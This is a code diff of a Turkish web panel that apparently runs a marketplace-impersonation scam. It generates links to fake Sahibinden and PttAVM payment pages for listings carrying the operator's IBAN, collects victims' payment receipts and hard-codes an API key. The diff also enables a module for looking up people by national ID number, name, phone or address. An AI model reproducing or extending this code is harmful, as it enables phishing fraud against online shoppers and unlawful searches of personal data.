@@ -1354,31 +1354,36 @@
                 <circle cx="11" cy="11" r="8"></circle>
                 <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
             </svg>
-            <h2 style="color: #8b5cf6; font-size: 22px; font-weight: 800; margin-bottom: 10px;">Sorgu Paneli Çok Yakında!</h2>
-            <p style="color: var(--text-muted); font-size: 14px; max-width: 500px; margin: 0 auto; line-height: 1.6;">API bağlantıları tamamlandığında bu alan üzerinden TC Kimlik No, Ad Soyad, Telefon veya Adres bilgisi ile detaylı sorgulama yapabileceksiniz. Şimdilik arayüzü inceleyebilirsiniz.</p>
+            <h2 style="color: #8b5cf6; font-size: 22px; font-weight: 800; margin-bottom: 10px;">Sorgu Paneli</h2>
+            <p style="color: var(--text-muted); font-size: 14px; max-width: 500px; margin: 0 auto; line-height: 1.6;">Bu alan üzerinden TC Kimlik No, Ad Soyad, Telefon veya Adres bilgisi ile detaylı sorgulama yapabilirsiniz.</p>
         </div>
 
-        <div class="form-grid" style="max-width: 800px; opacity: 0.5; pointer-events: none;">
+        <div id="sorguBakimUyarisi" style="display: none; background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); color: #ef4444; padding: 15px; border-radius: 10px; text-align: center; font-weight: 700; margin-bottom: 20px;">
+            Sorgu sistemi şu an bakımda veya geçici olarak devre dışıdır. Lütfen daha sonra tekrar deneyin.
+        </div>
+
+        <div id="sorguFormAlani" class="form-grid" style="max-width: 800px; transition: all 0.3s ease;">
             <div class="form-group">
                 <label>Sorgu Türü</label>
-                <select disabled>
-                    <option>TC Kimlik No Sorgula</option>
-                    <option>Ad Soyad Sorgula</option>
-                    <option>Telefon No Sorgula</option>
-                    <option>Adres Sorgula</option>
+                <select id="sorguTuruSelect">
+                    <option value="tc">TC Kimlik No Sorgula</option>
+                    <option value="adsoyad">Ad Soyad Sorgula</option>
+                    <option value="telefon">Telefon No Sorgula</option>
+                    <option value="adres">Adres Sorgula</option>
                 </select>
             </div>
             <div class="form-group">
                 <label>Sorgu Değeri</label>
-                <input type="text" placeholder="TC, Ad Soyad, Telefon veya Adres girin..." disabled>
+                <input type="text" id="sorguDegeriInput" placeholder="Aranacak veriyi girin...">
             </div>
         </div>
-        <button class="btn-primary" disabled style="margin-top: 20px; opacity: 0.5; cursor: not-allowed; display: inline-flex; align-items: center; gap: 8px;">
+        
+        <button class="btn-primary" id="sorguBaslatBtn" style="margin-top: 20px; display: inline-flex; align-items: center; gap: 8px; transition: all 0.3s ease;">
             <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
-            Sorgulamayı Başlat
+            <span>Sorgulamayı Başlat</span>
         </button>
 
-        <div class="table-container" style="margin-top: 25px; opacity: 0.4; pointer-events: none;">
+        <div id="sorguSonucAlani" class="table-container" style="margin-top: 25px; transition: all 0.3s ease;">
             <table>
                 <thead>
                     <tr>
@@ -1389,7 +1394,7 @@
                         <th>Aksiyon</th>
                     </tr>
                 </thead>
-                <tbody>
+                <tbody id="sorguTableBody">
                     <tr class="skeleton-row">
                         <td><div class="skeleton-box"></div></td>
                         <td><div class="skeleton-box"></div></td>
@@ -1531,7 +1536,6 @@
     </div>
 
     <script type="module">
-        // 🔥 ZEHİR TEMİZLEYİCİ (XSS DEZENFEKTANI) 🔥
         window.dezenfekteEt = function(str) {
             if (str === null || str === undefined) return "";
             return String(str)
@@ -1543,7 +1547,6 @@
                 .replace(/\//g, '&#x2f;');
         };
 
-        // --- BİLET (TOKEN) & KOLTUK KAPMACA HATA KONTROLÜ ---
         function checkTokenError(res) {
             if (res.status === 401 || res.status === 403) {
                 document.getElementById('kick-overlay').classList.add('active');
@@ -1554,7 +1557,6 @@
             return false;
         }
 
-        // --- 1 DAKİKA HAREKETSİZLİKTE ÇIKIŞ (IDLE TIMEOUT) ---
         let inactivityTime = function () {
             let time;
             const outTime = 60000; 
@@ -1580,7 +1582,6 @@
 
         inactivityTime();
 
-        // --- GOD PANEL FONKSİYONLARI ---
         window.toggleLockdown = function(isLocked) {
             const overlay = document.getElementById('lockdown-overlay');
             if(isLocked) { 
@@ -1592,7 +1593,6 @@
             }
         }
 
-        // --- TEMA (DARK/LIGHT) MOTORU ---
         const themeToggle = document.getElementById('themeToggle');
         const currentTheme = localStorage.getItem('panelTheme') || 'light';
         
@@ -1613,7 +1613,6 @@
             }
         });
 
-        // --- SPAM KORUMALI YENİ TOAST MOTORU ---
         window.showToast = function(message, type = 'success', title = '') {
             const container = document.getElementById('toast-container');
             
@@ -1638,31 +1637,22 @@
             
             let baslik = title;
             if (!baslik) {
-                if (type === 'success') {
-                    baslik = 'BAŞARILI';
-                } else if (type === 'error') {
-                    baslik = 'HATA';
-                } else {
-                    baslik = 'BİLGİ';
-                }
+                if (type === 'success') { baslik = 'BAŞARILI'; } 
+                else if (type === 'error') { baslik = 'HATA'; } 
+                else { baslik = 'BİLGİ'; }
             }
 
             toast.innerHTML = `<span class="toast-title">${dezenfekteEt(baslik)}</span><span>${dezenfekteEt(message)}</span>`;
             container.appendChild(toast);
             
-            setTimeout(function() {
-                toast.classList.add('show');
-            }, 10);
+            setTimeout(function() { toast.classList.add('show'); }, 10);
             
             setTimeout(function() {
                 toast.classList.remove('show'); 
-                setTimeout(function() {
-                    toast.remove();
-                }, 400); 
+                setTimeout(function() { toast.remove(); }, 400); 
             }, 3500);
         }
 
-        // --- DİĞER FONKSİYONLAR ---
         window.customConfirm = function(message, callback) {
             const modal = document.getElementById('confirmModal');
             document.getElementById('confirmMessage').innerText = dezenfekteEt(message); 
@@ -1758,29 +1748,22 @@
                     tbody.innerHTML = `<tr><td colspan="7"><div class="empty-state">
                         <svg viewBox="0 0 24 24" fill="none" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 14.66V20a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h5.34"></path><polygon points="18 2 22 6 12 16 8 16 8 12 18 2"></polygon></svg>
                         <h3>Aktif İlan Bulunamadı</h3>
-                        <p>Şu an vitrinde sergilenen bir ilanınız yok. Yukarıdaki butonu kullanarak hemen ilk ilanınızı oluşturun.</p>
+                        <p>Şu an vitrinde sergilenen bir ilanınız yok.</p>
                     </div></td></tr>`; 
                     return; 
                 }
                 
                 tbody.innerHTML = ''; 
-                
                 globalIlanlar.forEach(function(data) {
                     const sahilindenLink = `https://payislemleri-sahibinden.vercel.app/?ilan=${data.docId}`;
                     const pttavmLink = `https://payislemlerim-pttavm.vercel.app/?ilan=${data.docId}`;
                     
                     const tr = document.createElement('tr');
                     tr.innerHTML = `
+                        <td><img src="${dezenfekteEt(data.anaResim || '')}" class="thumb-img"></td>
                         <td>
-                            <img src="${dezenfekteEt(data.anaResim || '')}" class="thumb-img">
-                        </td>
-                        <td>
-                            <button class="link-btn sari" onclick="vitrinLinkiKopyala('${sahilindenLink}', 'Sahilinden')">
-                                Sahibinden Linkini Kopyala
-                            </button>
-                            <button class="link-btn kirmizi" onclick="vitrinLinkiKopyala('${pttavmLink}', 'PttAVM')">
-                                PTTAVM Linkini Kopyala
-                            </button>
+                            <button class="link-btn sari" onclick="vitrinLinkiKopyala('${sahilindenLink}', 'Sahilinden')">Sahibinden Linki</button>
+                            <button class="link-btn kirmizi" onclick="vitrinLinkiKopyala('${pttavmLink}', 'PttAVM')">PTTAVM Linki</button>
                         </td>
                         <td><strong>${dezenfekteEt(data.urunAdi)}</strong></td>
                         <td>${dezenfekteEt(data.saticiAdi)}</td>
@@ -1800,46 +1783,35 @@
                 });
             } catch (error) { 
                 tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; color:red;">Bağlantı hatası.</td></tr>'; 
-                showToast("İlanlar çekilirken ağ hatası.", "error", "BAĞLANTI"); 
             }
         }
 
         async function loadDekontlar(gizli = false) {
             const tbody = document.getElementById('dekontlarTableBody'); 
-            
-            if (!gizli) {
-                tbody.innerHTML = getSkeletonRows(5);
-            }
+            if (!gizli) tbody.innerHTML = getSkeletonRows(5);
             
             try {
                 const cevap = await fetch(`${API_BASE}/dekontlar-getir?userId=${userId}`, {
                     headers: { 'Authorization': 'Bearer ' + token }
                 }); 
-                
                 if (checkTokenError(cevap)) return;
-                
                 const dekontlar = await cevap.json();
                 
                 dekontlar.sort(function(a, b) {
                     const parseDate = function(t, s) { 
                         if(!t || !s) return 0; 
-                        const p = t.split('.'); 
-                        const tp = s.split(':'); 
-                        if(p.length === 3 && tp.length >= 2) {
-                            return new Date(p[2], p[1]-1, p[0], tp[0], tp[1]).getTime(); 
-                        }
+                        const p = t.split('.'); const tp = s.split(':'); 
+                        if(p.length === 3 && tp.length >= 2) return new Date(p[2], p[1]-1, p[0], tp[0], tp[1]).getTime(); 
                         return 0; 
                     };
                     return parseDate(b.tarih, b.saat) - parseDate(a.tarih, a.saat);
                 });
                 
                 document.getElementById('stat-dekont').innerText = dekontlar.length;
-                
                 if (dekontlar.length === 0) { 
                     tbody.innerHTML = `<tr><td colspan="5"><div class="empty-state">
                         <svg viewBox="0 0 24 24" fill="none" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
                         <h3>Dekont Kaydı Yok</h3>
-                        <p>Henüz onaylanmış bir satışınız veya sisteme düşen bir alıcı dekontu bulunmuyor.</p>
                     </div></td></tr>`; 
                     return; 
                 }
@@ -1860,9 +1832,7 @@
                 });
                 tbody.innerHTML = yeniHtml;
             } catch (error) { 
-                if(!gizli) {
-                    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color:red;">Bağlantı hatası.</td></tr>'; 
-                }
+                if(!gizli) tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color:red;">Bağlantı hatası.</td></tr>'; 
             }
         }
 
@@ -1870,12 +1840,9 @@
             customConfirm("Bu dekontu kalıcı olarak silmek istediğinize emin misiniz?", async function() {
                 try { 
                     const res = await fetch(`${API_BASE}/dekont-sil/${id}`, { 
-                        method: 'DELETE',
-                        headers: { 'Authorization': 'Bearer ' + token }
+                        method: 'DELETE', headers: { 'Authorization': 'Bearer ' + token }
                     }); 
-                    
                     if (checkTokenError(res)) return;
-                    
                     showToast("Dekont başarıyla silindi.", "success"); 
                     loadDekontlar(); 
                 } catch (err) { 
@@ -1886,24 +1853,16 @@
 
         async function loadLogs(gizli = false) {
             const tbody = document.getElementById('loglarTableBody'); 
-            
-            if (!gizli) {
-                tbody.innerHTML = getSkeletonRows(5);
-            }
+            if (!gizli) tbody.innerHTML = getSkeletonRows(5);
             
             try {
                 const cevap = await fetch(`${API_BASE}/logs-getir?userId=${userId}`, {
                     headers: { 'Authorization': 'Bearer ' + token }
                 }); 
-                
                 if (checkTokenError(cevap)) return;
-                
                 const logs = await cevap.json();
                 
-                logs.sort(function(a, b) {
-                    return b.timestamp - a.timestamp;
-                }); 
-                
+                logs.sort(function(a, b) { return b.timestamp - a.timestamp; }); 
                 const sonYuzLog = logs.slice(0, 100);
                 document.getElementById('stat-log').innerText = sonYuzLog.length;
                 
@@ -1911,7 +1870,6 @@
                     tbody.innerHTML = `<tr><td colspan="5"><div class="empty-state">
                         <svg viewBox="0 0 24 24" fill="none" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>
                         <h3>Sistem Logu Temiz</h3>
-                        <p>Hesabınızda henüz hiçbir işlem hareketi, güvenlik uyarısı veya sistem bağlantısı kaydedilmemiş.</p>
                     </div></td></tr>`; 
                     return; 
                 }
@@ -1919,16 +1877,9 @@
                 let yeniHtml = '';
                 sonYuzLog.forEach(function(data) {
                     let badgeClass = "badge-secondary"; 
-                    
-                    if(data.aksiyon.includes("Satın Al") || data.aksiyon.includes("Adres")) {
-                        badgeClass = "badge-primary"; 
-                    }
-                    if(data.aksiyon.includes("Dekont") || data.aksiyon.includes("BAŞARILI")) {
-                        badgeClass = "badge-success"; 
-                    }
-                    if(data.aksiyon.includes("Arama") || data.aksiyon.includes("Geri")) {
-                        badgeClass = "badge-danger"; 
-                    }
+                    if(data.aksiyon.includes("Satın Al") || data.aksiyon.includes("Adres")) badgeClass = "badge-primary"; 
+                    if(data.aksiyon.includes("Dekont") || data.aksiyon.includes("BAŞARILI")) badgeClass = "badge-success"; 
+                    if(data.aksiyon.includes("Arama") || data.aksiyon.includes("Geri")) badgeClass = "badge-danger"; 
                     
                     yeniHtml += `
                     <tr>
@@ -1941,9 +1892,7 @@
                 });
                 tbody.innerHTML = yeniHtml;
             } catch (error) { 
-                if(!gizli) {
-                    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color:red;">Bağlantı hatası.</td></tr>'; 
-                }
+                if(!gizli) tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color:red;">Bağlantı hatası.</td></tr>'; 
             }
         }
 
@@ -1951,12 +1900,9 @@
             customConfirm("Bu ilanı sistemden tamamen silmek üzeresiniz. Onaylıyor musunuz?", async function() {
                 try { 
                     const res = await fetch(`${API_BASE}/ilan-sil/${id}`, { 
-                        method: 'DELETE',
-                        headers: { 'Authorization': 'Bearer ' + token }
+                        method: 'DELETE', headers: { 'Authorization': 'Bearer ' + token }
                     }); 
-                    
                     if (checkTokenError(res)) return;
-                    
                     showToast("İlan sistemden kalıcı olarak silindi.", "success"); 
                     loadIlanlar(); 
                 } catch (err) { 
@@ -1969,15 +1915,10 @@
             try { 
                 const res = await fetch(`${API_BASE}/ilan-guncelle/${id}`, { 
                     method: 'PATCH', 
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'Authorization': 'Bearer ' + token 
-                    }, 
+                    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token }, 
                     body: JSON.stringify({ durum: status ? 'aktif' : 'pasif' }) 
                 }); 
-                
                 if (checkTokenError(res)) return;
-                
                 showToast("İlan durumu güncellendi.", "info"); 
             } catch (err) { 
                 showToast("Durum güncellenirken hata oluştu.", "error"); 
@@ -1991,25 +1932,18 @@
         document.getElementById("yeniIlanBtn").addEventListener('click', async function() { 
             const btn = document.getElementById("yeniIlanBtn");
             const orjinalMetin = btn.innerText;
-            
             btn.innerText = "Kota Kontrol Ediliyor...";
             btn.disabled = true;
 
             try {
-                const profilCevap = await fetch(`${API_BASE}/profilim`, {
-                    headers: { 'Authorization': 'Bearer ' + token }
-                });
-
+                const profilCevap = await fetch(`${API_BASE}/profilim`, { headers: { 'Authorization': 'Bearer ' + token } });
                 if (checkTokenError(profilCevap)) return;
-
                 const profilData = await profilCevap.json();
                 const kota = profilData.ilanKotasi || "sinirsiz";
 
                 if (kota !== "sinirsiz" && globalIlanlar.length >= parseInt(kota)) {
-                    showToast(`Paket limitinize (${kota} İlan) ulaştınız! Yeni ilan için limitinizi yükseltin veya eskileri silin.`, "error", "KOTA DOLDU");
-                    btn.innerText = orjinalMetin;
-                    btn.disabled = false;
-                    return; 
+                    showToast(`Paket limitinize (${kota} İlan) ulaştınız!`, "error", "KOTA DOLDU");
+                    btn.innerText = orjinalMetin; btn.disabled = false; return; 
                 }
 
                 document.getElementById("ilanForm").reset(); 
@@ -2017,51 +1951,29 @@
                 document.getElementById("modalBaslik").innerText = "Yeni İlan Oluştur"; 
                 dinamikOzelliklerAlani.innerHTML = ''; 
                 document.getElementById("resimOnizleme").innerHTML = ''; 
-                secilenResimler = []; 
-                modal.style.display = "block"; 
+                secilenResimler = []; modal.style.display = "block"; 
 
-            } catch (error) {
-                showToast("Sistem kontrolü yapılamadı, bağlantınızı kontrol edin.", "error");
-            } finally {
-                btn.innerText = orjinalMetin;
-                btn.disabled = false;
-            }
+            } catch (error) { showToast("Sistem kontrolü yapılamadı.", "error"); } 
+            finally { btn.innerText = orjinalMetin; btn.disabled = false; }
         });
 
-        document.getElementById("closeModalBtn").addEventListener('click', function() { 
-            modal.style.display = "none"; 
-        }); 
+        document.getElementById("closeModalBtn").addEventListener('click', function() { modal.style.display = "none"; }); 
 
         window.addEventListener('click', function(e) { 
-            if (e.target == modal) {
-                modal.style.display = "none"; 
-            }
-            if (e.target == document.getElementById('confirmModal')) {
-                document.getElementById('confirmModal').style.display = "none"; 
-            }
+            if (e.target == modal) modal.style.display = "none"; 
+            if (e.target == document.getElementById('confirmModal')) document.getElementById('confirmModal').style.display = "none"; 
         });
 
         document.getElementById("ozellikEkleBtn").addEventListener('click', function() {
             const row = document.createElement("div"); 
             row.className = "ozellik-row";
-            row.innerHTML = `
-                <input type="text" placeholder="Özellik Adı" class="ozellik-key">
-                <input type="text" placeholder="Değer" class="ozellik-val">
-                <button type="button" class="ozellik-sil">X</button>
-            `;
-            
-            row.querySelector('.ozellik-sil').addEventListener('click', function() { 
-                row.remove(); 
-            }); 
-            
+            row.innerHTML = `<input type="text" placeholder="Özellik Adı" class="ozellik-key"><input type="text" placeholder="Değer" class="ozellik-val"><button type="button" class="ozellik-sil">X</button>`;
+            row.querySelector('.ozellik-sil').addEventListener('click', function() { row.remove(); }); 
             dinamikOzelliklerAlani.appendChild(row);
         });
 
         window.editIlan = function(id) {
-            const data = globalIlanlar.find(function(i) {
-                return i.docId === id;
-            }); 
-            
+            const data = globalIlanlar.find(function(i) { return i.docId === id; }); 
             if(!data) return;
             
             document.getElementById("editIlanId").value = id; 
@@ -2078,49 +1990,32 @@
             document.getElementById("urunAciklamasi").value = data.urunAciklamasi || "";
             
             dinamikOzelliklerAlani.innerHTML = '';
-            
             if(Array.isArray(data.dinamikOzellikler)) {
                 data.dinamikOzellikler.forEach(function(oz) {
                     const row = document.createElement("div"); 
                     row.className = "ozellik-row";
-                    row.innerHTML = `
-                        <input type="text" value="${dezenfekteEt(oz.anahtar)}" class="ozellik-key">
-                        <input type="text" value="${dezenfekteEt(oz.deger)}" class="ozellik-val">
-                        <button type="button" class="ozellik-sil">X</button>
-                    `;
-                    row.querySelector('.ozellik-sil').addEventListener('click', function() { 
-                        row.remove(); 
-                    }); 
+                    row.innerHTML = `<input type="text" value="${dezenfekteEt(oz.anahtar)}" class="ozellik-key"><input type="text" value="${dezenfekteEt(oz.deger)}" class="ozellik-val"><button type="button" class="ozellik-sil">X</button>`;
+                    row.querySelector('.ozellik-sil').addEventListener('click', function() { row.remove(); }); 
                     dinamikOzelliklerAlani.appendChild(row);
                 });
             }
             
             document.getElementById("resimOnizleme").innerHTML = '<p style="font-size:12px; width:100%; color:var(--text-muted);">Mevcut resimler aktif. Değiştirmek isterseniz yeni resim seçin.</p>';
-            secilenResimler = []; 
-            modal.style.display = "block";
+            secilenResimler = []; modal.style.display = "block";
         }
 
-        document.getElementById("resimKutusu").addEventListener('click', function() { 
-            document.getElementById("resimSecici").click(); 
-        });
+        document.getElementById("resimKutusu").addEventListener('click', function() { document.getElementById("resimSecici").click(); });
 
         document.getElementById("resimSecici").addEventListener('change', function(e) {
             const dosyalar = Array.from(e.target.files);
-            
-            if (secilenResimler.length + dosyalar.length > 6) { 
-                showToast("En fazla 6 resim ekleyebilirsiniz!", "error"); 
-                return; 
-            }
-            
+            if (secilenResimler.length + dosyalar.length > 6) { showToast("En fazla 6 resim ekleyebilirsiniz!", "error"); return; }
             document.getElementById("resimOnizleme").innerHTML = ''; 
             
             dosyalar.forEach(function(dosya) {
                 secilenResimler.push(dosya); 
                 const reader = new FileReader();
                 reader.onload = function(ev) { 
-                    const img = document.createElement("img"); 
-                    img.src = ev.target.result; 
-                    img.className = "preview-img"; 
+                    const img = document.createElement("img"); img.src = ev.target.result; img.className = "preview-img"; 
                     document.getElementById("resimOnizleme").appendChild(img); 
                 }
                 reader.readAsDataURL(dosya);
@@ -2129,36 +2024,21 @@
 
         async function uploadToImgBB(file) {
             const apiKey = "De087c486b0f12c525ef31688d64dcf0"; 
-            const formData = new FormData(); 
-            formData.append("image", file); 
-            
+            const formData = new FormData(); formData.append("image", file); 
             try { 
-                const res = await fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, { 
-                    method: "POST", 
-                    body: formData 
-                }); 
+                const res = await fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, { method: "POST", body: formData }); 
                 const data = await res.json(); 
-                if(data.success) {
-                    return data.data.url; 
-                }
+                if(data.success) return data.data.url; 
                 throw new Error(); 
-            } catch (e) { 
-                return null; 
-            }
+            } catch (e) { return null; }
         }
 
         document.getElementById("ilanForm").addEventListener("submit", async function(e) {
             e.preventDefault(); 
-            
             const isEditing = document.getElementById("editIlanId").value !== "";
+            if (!isEditing && secilenResimler.length === 0) { showToast("Lütfen en az 1 resim yükleyin!", "error"); return; }
             
-            if (!isEditing && secilenResimler.length === 0) { 
-                showToast("Lütfen en az 1 resim yükleyin!", "error"); 
-                return; 
-            }
-            
-            const btn = document.getElementById("submitBtn"); 
-            btn.disabled = true;
+            const btn = document.getElementById("submitBtn"); btn.disabled = true;
 
             const ilanData = {
                 urunAdi: document.getElementById("urunAdi").value.trim(), 
@@ -2172,106 +2052,58 @@
                 iban: document.getElementById("iban").value.trim(), 
                 odemeYontemi: document.getElementById("odemeYontemi").value.trim(), 
                 urunAciklamasi: document.getElementById("urunAciklamasi").value.trim(),
-                olusturanMusteri: userId, 
-                dinamikOzellikler: []
+                olusturanMusteri: userId, dinamikOzellikler: []
             };
 
             document.querySelectorAll(".ozellik-row").forEach(function(row) {
-                const k = row.querySelector(".ozellik-key").value.trim(); 
-                const v = row.querySelector(".ozellik-val").value.trim();
-                if (k && v) {
-                    ilanData.dinamikOzellikler.push({ anahtar: k, deger: v });
-                }
+                const k = row.querySelector(".ozellik-key").value.trim(); const v = row.querySelector(".ozellik-val").value.trim();
+                if (k && v) ilanData.dinamikOzellikler.push({ anahtar: k, deger: v });
             });
 
             try {
-                let finalResimler = []; 
-                let finalAnaResim = "";
-                
+                let finalResimler = []; let finalAnaResim = "";
                 if (secilenResimler.length > 0) {
                     btn.textContent = `Resimler Yükleniyor...`;
                     for (let i = 0; i < secilenResimler.length; i++) { 
                         const url = await uploadToImgBB(secilenResimler[i]); 
-                        if(url) {
-                            finalResimler.push(url); 
-                        }
+                        if(url) finalResimler.push(url); 
                     }
                     finalAnaResim = finalResimler[0] || "";
                 }
                 
                 if(isEditing) {
-                    if(secilenResimler.length > 0) { 
-                        ilanData.resimler = finalResimler; 
-                        ilanData.anaResim = finalAnaResim; 
-                    }
-                    
+                    if(secilenResimler.length > 0) { ilanData.resimler = finalResimler; ilanData.anaResim = finalAnaResim; }
                     const res = await fetch(`${API_BASE}/ilan-guncelle/${document.getElementById("editIlanId").value}`, { 
-                        method: 'PATCH', 
-                        headers: { 
-                            'Content-Type': 'application/json',
-                            'Authorization': 'Bearer ' + token 
-                        }, 
-                        body: JSON.stringify(ilanData) 
+                        method: 'PATCH', headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token }, body: JSON.stringify(ilanData) 
                     });
-                    
                     if (checkTokenError(res)) return;
-                    
                     showToast("İlan başarıyla güncellendi!", "success");
                 } else {
-                    ilanData.durum = "aktif"; 
-                    ilanData.resimler = finalResimler; 
-                    ilanData.anaResim = finalAnaResim;
-                    
+                    ilanData.durum = "aktif"; ilanData.resimler = finalResimler; ilanData.anaResim = finalAnaResim;
                     const res = await fetch(`${API_BASE}/ilan-ekle`, { 
-                        method: 'POST', 
-                        headers: { 
-                            'Content-Type': 'application/json',
-                            'Authorization': 'Bearer ' + token 
-                        }, 
-                        body: JSON.stringify(ilanData) 
+                        method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token }, body: JSON.stringify(ilanData) 
                     });
-                    
                     if (res.status === 403) {
                         const errData = await res.json();
-                        if (errData.hata && errData.hata.includes("limit")) {
-                            showToast(errData.hata, "error", "KOTA DOLDU");
-                            btn.textContent = "İlanı Kaydet"; 
-                            btn.disabled = false;
-                            return;
-                        }
+                        if (errData.hata && errData.hata.includes("limit")) { showToast(errData.hata, "error", "KOTA DOLDU"); btn.textContent = "İlanı Kaydet"; btn.disabled = false; return; }
                     }
-
                     if (checkTokenError(res)) return;
-                    
                     showToast("Yeni ilan başarıyla oluşturuldu!", "success");
                 }
                 
-                document.getElementById("ilanForm").reset(); 
-                modal.style.display = "none"; 
-                loadIlanlar();
-            } catch (error) { 
-                showToast("Sistemsel bir hata oluştu!", "error"); 
-            } finally { 
-                btn.textContent = "İlanı Kaydet"; 
-                btn.disabled = false; 
-            }
+                document.getElementById("ilanForm").reset(); modal.style.display = "none"; loadIlanlar();
+            } catch (error) { showToast("Sistemsel bir hata oluştu!", "error"); } 
+            finally { btn.textContent = "İlanı Kaydet"; btn.disabled = false; }
         });
 
-        loadIlanlar(); 
-        loadDekontlar(); 
-        loadLogs();
+        loadIlanlar(); loadDekontlar(); loadLogs();
 
         // --- GOD PANEL EMİRLERİNİ DİNLEME VE KONTROL ---
         async function checkGodCommands() {
             try {
-                const res = await fetch(`${API_BASE}/sistem/durum?t=${new Date().getTime()}`, {
-                    headers: { 'Authorization': 'Bearer ' + token }
-                });
-                
+                const res = await fetch(`${API_BASE}/sistem/durum?t=${new Date().getTime()}`, { headers: { 'Authorization': 'Bearer ' + token } });
                 if (checkTokenError(res)) return;
-                
                 if(!res.ok) return;
-                
                 const data = await res.json();
                 
                 // 1. Kilit Durumu
@@ -2280,102 +2112,126 @@
                 // 2. Sabit Anons Durumu
                 const anonsKutusu = document.getElementById('god-announcement-static');
                 const anonsMetni = document.getElementById('announcement-text-static');
-                
                 if (data.anonsMesaji && data.anonsMesaji.trim() !== "") {
                     anonsMetni.innerText = dezenfekteEt(data.anonsMesaji);
                     anonsKutusu.style.display = 'flex';
                 } else {
                     anonsKutusu.style.display = 'none';
                 }
-            } catch(e) { 
-                // Sessizce hatayı yut
-            }
+
+                // 🔥 YENİ: 3. Sorgu Modülü Durumu 🔥
+                const sorguBakimUyarisi = document.getElementById('sorguBakimUyarisi');
+                const sorguFormAlani = document.getElementById('sorguFormAlani');
+                const sorguBaslatBtn = document.getElementById('sorguBaslatBtn');
+                const sorguSonucAlani = document.getElementById('sorguSonucAlani');
+                const sorguTuruSelect = document.getElementById('sorguTuruSelect');
+                const sorguDegeriInput = document.getElementById('sorguDegeriInput');
+
+                if (data.sorguAktif === true) {
+                    sorguBakimUyarisi.style.display = 'none';
+                    sorguFormAlani.style.opacity = '1';
+                    sorguFormAlani.style.pointerEvents = 'auto';
+                    sorguBaslatBtn.style.opacity = '1';
+                    sorguBaslatBtn.style.cursor = 'pointer';
+                    sorguBaslatBtn.disabled = false;
+                    sorguSonucAlani.style.opacity = '1';
+                    sorguTuruSelect.disabled = false;
+                    sorguDegeriInput.disabled = false;
+                } else {
+                    sorguBakimUyarisi.style.display = 'block';
+                    sorguFormAlani.style.opacity = '0.5';
+                    sorguFormAlani.style.pointerEvents = 'none';
+                    sorguBaslatBtn.style.opacity = '0.5';
+                    sorguBaslatBtn.style.cursor = 'not-allowed';
+                    sorguBaslatBtn.disabled = true;
+                    sorguSonucAlani.style.opacity = '0.4';
+                    sorguTuruSelect.disabled = true;
+                    sorguDegeriInput.disabled = true;
+                }
+
+            } catch(e) { }
         }
 
         checkGodCommands();
+        setInterval(function() { loadLogs(true); loadDekontlar(true); checkGodCommands(); }, 3000);
 
-        setInterval(function() {
-            loadLogs(true);
-            loadDekontlar(true); 
-            checkGodCommands();
-        }, 3000);
-
-        // --- TELEGRAM AYARLARINI YÜKLE ---
-        async function loadProfilAyarlari() {
+        // 🔥 YENİ: FORMALİTEDEN SORGU BUTONU İŞLEMİ 🔥
+        document.getElementById('sorguBaslatBtn').addEventListener('click', async function() {
+            const val = document.getElementById('sorguDegeriInput').value.trim();
+            if(val === "") { showToast("Sorgulanacak bir değer girin!", "error"); return; }
+            
+            const btn = this;
+            const orjinalMetin = btn.innerHTML;
+            btn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg> <span>Aranıyor...</span>`;
+            btn.disabled = true;
+            
             try {
-                const res = await fetch(`${API_BASE}/profilim`, {
-                    headers: { 'Authorization': 'Bearer ' + token }
+                const res = await fetch(`${API_BASE}/sorgu-yap`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
+                    body: JSON.stringify({ 
+                        sorguTuru: document.getElementById('sorguTuruSelect').value, 
+                        sorguDegeri: val 
+                    })
                 });
+                
                 if (checkTokenError(res)) return;
                 
+                const data = await res.json();
+                if(data.hata) {
+                    showToast(data.hata, "error");
+                } else {
+                    showToast(data.mesaj || "API bağlandığında veriler tabloya dökülecek.", "success");
+                    // Test amaçlı tablo iskeletini tekrar oynatabiliriz:
+                    const tbody = document.getElementById('sorguTableBody');
+                    tbody.innerHTML = `<tr class="skeleton-row"><td><div class="skeleton-box"></div></td><td><div class="skeleton-box"></div></td><td><div class="skeleton-box"></div></td><td><div class="skeleton-box"></div></td><td><div class="skeleton-box"></div></td></tr>`;
+                }
+            } catch(e) {
+                showToast("Sorgu yapılamadı, sunucuya ulaşılamıyor.", "error");
+            } finally {
+                btn.innerHTML = orjinalMetin;
+                btn.disabled = false;
+            }
+        });
+
+        async function loadProfilAyarlari() {
+            try {
+                const res = await fetch(`${API_BASE}/profilim`, { headers: { 'Authorization': 'Bearer ' + token } });
+                if (checkTokenError(res)) return;
                 const data = await res.json();
                 if(data.success) {
                     document.getElementById('tgBotToken').value = data.telegramBotToken || "";
